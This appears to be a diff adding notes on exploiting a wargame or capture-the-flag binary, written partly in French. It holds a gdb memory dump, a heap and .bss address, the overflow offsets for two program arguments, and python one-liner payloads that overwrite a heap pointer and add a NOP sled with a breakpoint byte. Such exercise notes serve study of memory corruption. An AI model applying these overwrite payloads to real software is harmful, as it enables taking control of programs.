@@ -40,3 +40,29 @@ Strategy
 => modify c variable, to fgets flag -> overwrite bss data ?
 =>
 
+
+
+
+0xbffff8fc:	0x6c2f376c	0x6c657665	0x41410037	0x41414141
+0xbffff90c:	0x41414141	0x41414141	0x41414141	0x00414141
+0xbffff91c:	0x48530041	0x3d4c4c45	0x6e69622f	0x7361622f
+
+
+return du premier malloc eax = 0x804a008
+on en deduit que c'est une addresse dans la heap.
+
+08049960 g     O .bss	00000050              c
+
+First argument segfault after:
+python -c 'print "A"*20' -> + 4 bytes equal one of the malloc address pVar[1]
+
+Second argument segfault after:
+python -c 'print "B"*71' -> next bytes touch free allocation table
+
+r `python -c 'print "A"*20 + "\x60\x99\x04\x08"'` `python -c 'print "\x70\xf7\xff\xbf"'`
+
+
+
+`python -c 'print "A"*20 + "\xfc\xf6\xff\xbf"'` `python -c 'print "\x10\xf7\xff\xbf" + "\x90"*50 + "\xCC"'`
+
+
